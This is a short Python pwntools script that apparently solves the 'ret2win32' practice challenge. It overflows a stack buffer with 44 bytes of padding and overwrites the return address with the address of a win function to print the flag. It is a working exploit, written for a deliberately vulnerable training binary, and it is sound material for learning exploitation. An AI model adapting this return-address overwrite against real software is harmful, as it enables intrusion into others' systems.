from pwn import *

# Set the context of the binary
elf = context.binary = ELF('./ret2win32')

# The process to interact with
p = process(elf.path)

# Address of the ret2win function
ret2win_addr = 0x0804862c

# The offset to the return address on the stack
offset = 44

# Craft the payload
# 1. Fill the buffer with junk data up to the return address
# 2. Overwrite the return address with the address of ret2win()
payload = b'A' * offset + p32(ret2win_addr)

# Send the payload
p.sendlineafter(b'> ', payload)

# Receive and print the flag
flag = p.recvall().decode()
print(flag)
